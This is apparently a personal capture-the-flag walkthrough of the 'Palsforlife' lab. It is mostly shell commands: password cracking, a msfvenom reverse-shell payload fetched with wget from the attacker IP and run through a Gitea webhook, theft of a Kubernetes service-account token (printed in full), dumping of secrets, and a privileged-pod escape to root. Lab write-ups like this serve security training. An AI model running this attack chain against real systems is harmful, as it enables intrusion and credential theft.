# Palsforlife 

> VOiD | Monday 25 October 2021 10:23:31 PM IST

My IP : 10.8.253.221
Target IP : 10.10.69.178

## Rustscan
```bash
Open 10.10.69.178:22
Open 10.10.69.178:6443
Open 10.10.69.178:30180
Open 10.10.69.178:31111
Open 10.10.69.178:31112
```

## PORT 30180[Nginx]

http://10.10.69.178:30180/team/

we get a hidden base64 
```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
chickenlegs      (e.pdf)

I_am_geniu5_P4ladin#
```


## PORT 31111[Gitea]

http://10.10.69.178:31111/explore/users
leeroy
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.8.253.221 LPORT=4444 -f elf > shell

wget http://10.8.253.221/shell && chmod 777 shell && ./shell

http://10.10.69.178:31111/leeroy/jenkins/settings/hooks/1
flag{Stick_to_the_plan!}

```

```bash
gitea-0:/root$ cat flag2.txt 
flag{_G0ddamit_Leeroy_}


```

## Shell [gitea]
```bash
gitea-0:~/repositories/leeroy/jenkins.git$ cat /run/secrets/kubernetes.io/serviceaccount/token 
eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w

curl -k -v -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w" https://10.10.69.178:6443/api/v1/namespaces/default/secrets/
```

## Kubectl
```bash
To make it easier to use
alias kubectl='kubectl --server=https://10.10.69.178:6443 --token=eyJhbGciOiJSUzI1NiIsImtpZCI6IkNtT1RDZkpCdzVWVjR2eVE2OVl3TGlya0tVZ21oY1NrTVBuUnUwb0JUU2sifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJkZWZhdWx0Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6ImRlZmF1bHQtdG9rZW4tcXM2aHAiLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC5uYW1lIjoiZGVmYXVsdCIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VydmljZS1hY2NvdW50LnVpZCI6IjhlYjIwMTIwLTQ1M2MtNDI3YS05ZDZiLTQyZmZlNDY3MGMzZCIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.mzW7wWtI8ch5EDMQEhCD3jY4g56CzhO1RPyHUx5bYF7ZJVKH_qdniY0watK8GoQXNeGJKp7vk2B68efG4UaWWMCiJR6vX_d7L3HxDSbHebbD2WL17AhDFXE8QDkuZ2mO_dLnKm_DBrMA2_63v5JQfXJnU-rjSD4Xq39_LVI106frHLqVkX-roHzY4fHGjYe8ys9pwuy7Wk3QCRrYfnyuuVpglKCPfaLLnUdgbVg-x7zGrK_4MB780V7TNdZ0pH0dpfTxyS7L5KeW8uKVsG0hsfBXABv-Q_BsGuvvotpdPzrsAWkBspRRsoOPq28Cfl6uOZBAx_djkHFv3vza54WS9w --insecure-skip-tls-verify'


kubectl get namespaces
NAME              STATUS   AGE
default           Active   303d
kube-system       Active   303d
kube-public       Active   303d
kube-node-lease   Active   303d

kubectl get secrets -o yaml -n kube-system

echo ZmxhZ3tJdHNfbjB0X215X2ZhdWx0IX0 | base64 -d 
flag{Its_n0t_my_fault!}


kubectl auth can-i --list
Resources   Non-Resource URLs   Resource Names   Verbs
*.*         []                  []               [*]
            [*]                 []               [*]

kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml

kubectl apply -f app.yaml
kubectl exec -it attacker -- bash

root@attacker:~/root# cat root.txt 
flag{At_least_I_have_chicKen}

```